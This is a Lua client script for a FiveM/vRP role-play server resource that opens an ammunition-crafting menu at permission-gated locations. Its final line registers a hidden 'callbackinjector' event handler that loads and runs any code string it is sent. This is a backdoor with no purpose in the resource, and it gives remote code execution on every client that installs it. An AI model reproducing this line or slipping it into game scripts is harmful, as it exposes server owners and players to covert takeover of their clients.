local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")

dM = Tunnel.getInterface("alien_municao")
-------------------------------------------------------------------------------------------------
--[ DM ] LOCAIS 
-------------------------------------------------------------------------------------------------
local locais = {
	{ ['x'] = -2674.29, ['y'] = 1329.2, ['z'] = 140.89, ['perm'] = "municao.permissao" }, --- TRIADE
--	{ ['x'] = -1563.97, ['y'] = 778.66, ['z'] = 189.2, ['perm'] = "mafia.permissao" },
	{ ['x'] = -894.6, ['y'] = -1442.76, ['z'] = 7.53, ['perm'] = "municao.permissao" }, --- YAKUZA
--	{ ['x'] = -1020.22, ['y'] = -1487.16, ['z'] = -3.32, ['perm'] = "yakuza.permissao" }, --412.25637817383,4.142153263092,84.921455383301
}
-------------------------------------------------------------------------------------------------
--[ DM ] MENU  
-------------------------------------------------------------------------------------------------
local menuactive = false
local onmenu = false

function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		TransitionToBlurred(1000)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		TransitionFromBlurred(1000)
		SendNUIMessage({ hidemenu = true })
	end
end
-------------------------------------------------------------------------------------------------
--[ DM ] FUNCAO DOS BOTOES 
-------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	
	if data == "produzir-m-ak" then
		TriggerServerEvent("produzir-municao","m-ak")

	elseif data == "produzir-m-fiveseven" then
		TriggerServerEvent("produzir-municao","m-fiveseven")

	elseif data == "produzir-m-uzi" then
		TriggerServerEvent("produzir-municao","m-uzi")

	elseif data == "produzir-m-mtar" then
		TriggerServerEvent("produzir-municao","m-mtar")

	elseif data == "produzir-m-thompson" then
		TriggerServerEvent("produzir-municao","m-thompson")

	elseif data == "fechar" then
		ToggleActionMenu()
		onmenu = false
	end
end)

RegisterNetEvent("fechar-nui-municao")
AddEventHandler("fechar-nui-municao", function()
	ToggleActionMenu()
	onmenu = false
end)
-------------------------------------------------------------------------------------------------
--[ DM ] ACAO DE ABRIR O PAINEL 
-------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local dmshop = 1000
		for _,v in pairs(locais) do
			local ped = PlayerPedId()
			local x,y,z = table.unpack(v)
			local distance = GetDistanceBetweenCoords(GetEntityCoords(ped),v.x,v.y,v.z)
			if distance <= 2  then
				dmshop = 5
				DrawText3D(v.x,v.y,v.z, "[~r~E~w~] Para acessar a ~r~BANCADA~w~.")
				if distance <= 1 and IsControlJustPressed(0,38) then
					dmshop = 5
					if dM.checkPermission(v.perm) then
						ToggleActionMenu()
						onmenu = true
					end
				end
			end
		end
		Citizen.Wait(dmshop)
	end
end)
-------------------------------------------------------------------------------------------------
--[ DM ] FUNÇÃO 3D
-------------------------------------------------------------------------------------------------
function DrawText3D(x, y, z, text)
    local onScreen,_x,_y=World3dToScreen2d(x,y,z)
    local px,py,pz=table.unpack(GetGameplayCamCoords())
    
    SetTextScale(0.28, 0.28)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, 215)
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(_x,_y)
    local factor = (string.len(text)) / 370
    DrawRect(_x,_y+0.0125, 0.005+ factor, 0.03, 41, 11, 41, 68)
end

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)